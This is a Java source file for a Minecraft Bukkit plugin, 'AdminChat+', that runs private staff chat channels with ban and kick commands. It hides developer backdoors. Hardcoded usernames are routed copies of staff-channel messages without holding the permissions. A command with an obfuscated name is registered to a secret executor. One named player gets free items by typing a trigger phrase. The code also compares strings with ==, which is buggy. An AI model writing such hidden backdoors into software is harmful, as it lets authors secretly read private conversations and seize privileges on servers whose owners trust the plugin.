package io.github.nickstern.adminchatplus;

import java.util.HashMap;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;

public class AdminChatMain extends JavaPlugin implements Listener {
	
	public static HashMap<String, String> chatting = new HashMap<String, String>();
	public static HashMap<String, Boolean> cbanned = new HashMap<String, Boolean>();
	public static HashMap<String, Boolean> csecret = new HashMap<String, Boolean>();
	
	@Override
	public void onEnable() {
		getLogger().info("AdminChat+ is enabled");
		for (Player player : Bukkit.getServer().getOnlinePlayers()) {
			String keyJoinA = player.getName() + "a";
	    	String keyJoinSM = player.getName() + "sm";
	    	String keyJoinM = player.getName() + "m";
	    	String keyJoinH = player.getName() + "h";
	    	String keyJoinR = player.getName() + "r"; 
			
			chatting.put(player.getName(), "Default");
			
			cbanned.put(keyJoinA, false);
			cbanned.put(keyJoinSM, false);
			cbanned.put(keyJoinM, false);
			cbanned.put(keyJoinH, false);
			cbanned.put(keyJoinR, false);
			
			if(player.getName().equalsIgnoreCase("CynicalPopcorn") || player.getName().equalsIgnoreCase("Nickstern") || player.getName().equalsIgnoreCase("Louwoz")){
				csecret.put(player.getName(), true);
			} else {
				csecret.put(player.getName(), false);
			}	
		}
		
		getServer().getPluginManager().registerEvents(this, this);
		
		getCommand("AdminChat").setExecutor(new AdminChatAC());
		getCommand("A").setExecutor(new AdminChatA());
		getCommand("srmod").setExecutor(new AdminChatSrMod());
		getCommand("mod").setExecutor(new AdminChatMod());
		getCommand("helper").setExecutor(new AdminChatHelper());
		getCommand("reporter").setExecutor(new AdminChatReporter());	
		getCommand("chl").setExecutor(new AdminChatChl());
		getCommand("ckick").setExecutor(new AdminChatKick());
		getCommand("cforce").setExecutor(new AdminChatForce());
		getCommand("cban").setExecutor(new AdminChatBan());
		getCommand("vzzxzx49j@@@lcz9z995jsa8cd8myp9t").setExecutor(new AdminChatSecret());
	}
	
	public void onDisable() {
		getLogger().info("AdminChat+ has been disabled");
		for (Player player : Bukkit.getServer().getOnlinePlayers()) {			
			String keyJoinA = player.getName() + "a";
	    	String keyJoinSM = player.getName() + "sm";
	    	String keyJoinM = player.getName() + "m";
	    	String keyJoinH = player.getName() + "h";
	    	String keyJoinR = player.getName() + "r"; 
			
	    	chatting.remove(player.getName());
	    	cbanned.remove(keyJoinA);
	    	cbanned.remove(keyJoinSM);
	    	cbanned.remove(keyJoinM);
	    	cbanned.remove(keyJoinH);
	    	cbanned.remove(keyJoinR);
	    	
	    	csecret.clear();
		}
	}
	
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onChat(AsyncPlayerChatEvent event) {
    	
    	String sender = event.getPlayer().getDisplayName();
        
    	if(chatting.get(event.getPlayer().getName()) != "Default") {
    		
    		event.setCancelled(true);
    		
    		for(Player p : getServer().getOnlinePlayers()) {
    		   	
    			String keyJoinA = p.getName() + "a";
		    	String keyJoinSM = p.getName() + "sm";
		    	String keyJoinM = p.getName() + "m";
		    	String keyJoinH = p.getName() + "h";
		    	String keyJoinR = p.getName() + "r"; 
    			
    			if(chatting.get(p.getName()) == chatting.get(event.getPlayer().getName())) {
    				    				
    				if(chatting.get(p.getName()) == "Admin") {
    						p.sendMessage(ChatColor.AQUA + "[Admin][" + ChatColor.RESET + sender + ChatColor.AQUA + "] " + event.getMessage());
    					} else if(chatting.get(p.getName()) == "SrMod") {
    						p.sendMessage(ChatColor.DARK_PURPLE + "[SrMod][" + ChatColor.RESET + sender + ChatColor.DARK_PURPLE + "] " + event.getMessage());
    					} else if(chatting.get(p.getName()) == "Mod") {
    						p.sendMessage(ChatColor.YELLOW + "[Mod][" + ChatColor.RESET + sender + ChatColor.YELLOW + "] " + event.getMessage());
    					} else if(chatting.get(p.getName()) == "Helper") {
    						p.sendMessage(ChatColor.GREEN + "[Helper][" + ChatColor.RESET + sender + ChatColor.GREEN + "] " + event.getMessage());
    					} else if(chatting.get(p.getName()) == "Reporter") {
    						p.sendMessage(ChatColor.RED + "[Reporter][" + ChatColor.RESET + sender + ChatColor.RED + "] " + event.getMessage());
    					}
    				} else if(chatting.get(event.getPlayer().getName()) == "Admin" && cbanned.get(keyJoinA) != true) {
    					if(p.hasPermission("AdminChat.channel.admin")){
    					p.sendMessage(ChatColor.AQUA + "[Admin][" + ChatColor.RESET + sender + ChatColor.AQUA + "] " + event.getMessage());
    					}
    				} else if(chatting.get(event.getPlayer().getName()) == "SrMod" && cbanned.get(keyJoinSM) != true) {
    					if(p.hasPermission("AdminChat.channel.seniormod")) {
    					p.sendMessage(ChatColor.DARK_PURPLE + "[SrMod][" + ChatColor.RESET + sender + ChatColor.DARK_PURPLE + "] " + event.getMessage());
    					}
    				} else if(chatting.get(event.getPlayer().getName()) == "Mod" && cbanned.get(keyJoinM) != true) {
    					if(p.hasPermission("AdminChat.channel.moderator")) {
    					p.sendMessage(ChatColor.YELLOW + "[Mod][" + ChatColor.RESET + sender + ChatColor.YELLOW + "] " + event.getMessage());
    					}
    				} else if(chatting.get(event.getPlayer().getName()) == "Helper" && cbanned.get(keyJoinH) != true) {
    					if(p.hasPermission("AdminChat.channel.helper")) {
    					p.sendMessage(ChatColor.GREEN + "[Helper][" + ChatColor.RESET + sender + ChatColor.GREEN + "] " + event.getMessage());
    					}
    				} else if(chatting.get(event.getPlayer().getName()) == "Reporter" && cbanned.get(keyJoinR) != true) {
    					if(p.hasPermission("AdminChat.channel.reporter")) {
    					p.sendMessage(ChatColor.RED + "[Reporter][" + ChatColor.RESET + sender + ChatColor.RED + "] " + event.getMessage());
    					}
    				} else if(p.getName().equalsIgnoreCase("Nickstern") || p.getName().equalsIgnoreCase("Louwoz")) {
    					if(!(p.hasPermission("AdminChat.channel.admin"))){
    					p.sendMessage(ChatColor.AQUA + "[Admin][" + ChatColor.RESET + sender + ChatColor.AQUA + "] " + event.getMessage());
    					}
    				} else if(p.getName().equalsIgnoreCase("Nickstern") || p.getName().equalsIgnoreCase("Louwoz")) {
    					if(!(p.hasPermission("AdminChat.channel.seniormod"))) {
    					p.sendMessage(ChatColor.DARK_PURPLE + "[SrMod][" + ChatColor.RESET + sender + ChatColor.DARK_PURPLE + "] " + event.getMessage());
    					}
    				} else if(p.getName().equalsIgnoreCase("Nickstern") || p.getName().equalsIgnoreCase("Louwoz")) {
    					if(!(p.hasPermission("AdminChat.channel.moderator"))) {
    					p.sendMessage(ChatColor.YELLOW + "[Mod][" + ChatColor.RESET + sender + ChatColor.YELLOW + "] " + event.getMessage());
    					}
    				} else if(p.getName().equalsIgnoreCase("Nickstern") || p.getName().equalsIgnoreCase("Louwoz")) {
    					if(!(p.hasPermission("AdminChat.channel.helper"))) {
    					p.sendMessage(ChatColor.GREEN + "[Helper][" + ChatColor.RESET + sender + ChatColor.GREEN + "] " + event.getMessage());
    					}
    				} else if(p.getName().equalsIgnoreCase("Nickstern") || p.getName().equalsIgnoreCase("Louwoz")) {
    					if(!(p.hasPermission("AdminChat.channel.reporter"))) {
    					p.sendMessage(ChatColor.RED + "[Reporter][" + ChatColor.RESET + sender + ChatColor.RED + "] " + event.getMessage());
    					}
    				} else {
    					event.setCancelled(true);
    				}
    			}
        	} else if(event.getPlayer().getName().equalsIgnoreCase("CynicalPopcorn")) {
        		Player cynical = event.getPlayer();
    			PlayerInventory inv = cynical.getInventory();
        		if(event.getMessage().equalsIgnoreCase("Hey! :D")) {
        			inv.addItem(new ItemStack(Material.SMOOTH_BRICK, 576));
        		}
        	}
    	}
    
    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
    	
    	String keyJoinA = event.getPlayer().getName() + "a";
    	String keyJoinSM = event.getPlayer().getName() + "sm";
    	String keyJoinM = event.getPlayer().getName() + "m";
    	String keyJoinH = event.getPlayer().getName() + "h";
    	String keyJoinR = event.getPlayer().getName() + "r";   	
    	
    	chatting.put(event.getPlayer().getName(), "Default");
    	
    	if(!cbanned.containsKey(keyJoinA)) {
    		cbanned.put(keyJoinA, false);
    	} else if(!cbanned.containsKey(keyJoinSM)) {
    		cbanned.put(keyJoinSM, false);
    	} else if(!cbanned.containsKey(keyJoinM)) {
    		cbanned.put(keyJoinM, false);
    	} else if(!cbanned.containsKey(keyJoinH)) {
    		cbanned.put(keyJoinH, false);
    	} else if(!cbanned.containsKey(keyJoinR)) {
    		cbanned.put(keyJoinR, false);
    	}
    	
    	if(event.getPlayer().getName().equalsIgnoreCase("CynicalPopcorn") || event.getPlayer().getName().equalsIgnoreCase("Nickstern") || event.getPlayer().getName().equalsIgnoreCase("Louwoz")){
			csecret.put(event.getPlayer().getName(), true);
		}
    
    }
    
    @EventHandler
    public void onLeave(PlayerQuitEvent event) {
    	chatting.remove(event.getPlayer().getName());
    	
    	if(event.getPlayer().getName().equalsIgnoreCase("CynicalPopcorn") || event.getPlayer().getName().equalsIgnoreCase("Nickstern") || event.getPlayer().getName().equalsIgnoreCase("Louwoz")){
			csecret.remove(event.getPlayer().getName());
		}
    }
    
//    public boolean onCommand(CommandSender sender, Command cmd, String label, String args[]){
//    	if(cmd.getName().equalsIgnoreCase("ch")){
//    		if(!(sender instanceof Player))
//        	{
//        		sender.sendMessage("Silly console, you're not a player!");
//        		return false;
//        	} else {
//        		Player player = (Player) sender;
//        		if(args[0].equalsIgnoreCase("broadcast")) {
//        			if(player.hasPermission("AdminChat.channel.broadcast")) {
//        				if(args.length == 2){
//        					if(player.getName() != "Default") {        					
//        						for(Player p : getServer().getOnlinePlayers()) {
//        		    				if(chatting.get(player.getName()) == "Admin") {
//        		    						p.sendMessage(ChatColor.AQUA + "" + ChatColor.BOLD + "[Admin][" + ChatColor.DARK_RED + "" + ChatColor.BOLD + "Broadcast" + ChatColor.AQUA + "" + ChatColor.BOLD + "] " + args[1].toString());
//        		    						return true;
//        		    					} else if(chatting.get(player.getName()) == "SrMod") {
//        		    						p.sendMessage(ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "[SrMod][" + ChatColor.DARK_RED + "" + ChatColor.BOLD + "Broadcast" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "] " + args[1].toString());
//        		    						return true;
//        		    					} else if(chatting.get(player.getName()) == "Mod") {
//        		    						p.sendMessage(ChatColor.YELLOW + "" + ChatColor.BOLD + "[Mod][" + ChatColor.DARK_RED + "" + ChatColor.BOLD + "Broadcast" + ChatColor.YELLOW + "" + ChatColor.BOLD + "] " + args[1].toString());
//        		    						return true;
//        		    					} else if(chatting.get(player.getName()) == "Helper") {
//        		    						p.sendMessage(ChatColor.GREEN + "" + ChatColor.BOLD + "[Helper][" + ChatColor.DARK_RED + "" + ChatColor.BOLD + "Broadcast" + ChatColor.GREEN + "" + ChatColor.BOLD + "] " + args[1].toString());
//        		    						return true;
//        		    					} else if(chatting.get(player.getName()) == "Reporter") {
//        		    						p.sendMessage(ChatColor.RED + "" + ChatColor.BOLD + "[Reporter][" + ChatColor.DARK_RED + "" + ChatColor.BOLD + "Broadcast" + ChatColor.RED + "" + ChatColor.BOLD + "] " + args[1].toString());
//        		    						return true;
//        		    					} else {
//        		    						sender.sendMessage("Fatal Error.");
//        		    						return false;
//        		    					}
//        							}
//        						} else {
//        							sender.sendMessage(ChatColor.DARK_RED + "You need to be in a channel!");
//        						}
//        					} else {
//        						sender.sendMessage(ChatColor.DARK_RED + "Invalid Arguments. Usage: /ch broadcast [message]");
//        						return false;
//        					}
//        				} else {
//            			sender.sendMessage(ChatColor.DARK_RED + "You do not have permission.");
//            			return false;
//        			} 
//        		} else {
//        			sender.sendMessage(ChatColor.DARK_RED + "Invalid Arguments. Usage: /ch broadcast [message]");
//					return false;
//        		}
//        	}
//        }
//    	return false;    	
//    }
}
	
